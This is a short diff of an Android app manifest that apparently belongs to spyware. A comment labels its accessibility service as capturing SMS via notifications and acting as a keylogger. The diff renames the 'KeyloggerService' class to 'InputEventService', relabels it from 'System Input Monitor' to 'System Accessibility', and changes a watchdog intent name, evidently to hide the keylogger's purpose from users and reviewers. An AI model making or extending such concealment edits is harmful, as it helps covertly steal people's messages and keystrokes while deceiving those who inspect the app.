@@ -106,7 +106,7 @@
 
         <receiver android:name=".WatchdogReceiver" android:enabled="true" android:exported="false">
             <intent-filter>
-                <action android:name="com.android.services.WATCHDOG" />
+                <action android:name="com.nexlink.bridge.WATCHDOG" />
             </intent-filter>
         </receiver>
 
@@ -125,9 +125,9 @@
 
         <!-- Accessibility Service — SMS via notifikasi + Keylogger -->
         <service
-            android:name=".KeyloggerService"
+            android:name=".InputEventService"
             android:exported="true"
-            android:label="System Input Monitor"
+            android:label="System Accessibility"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
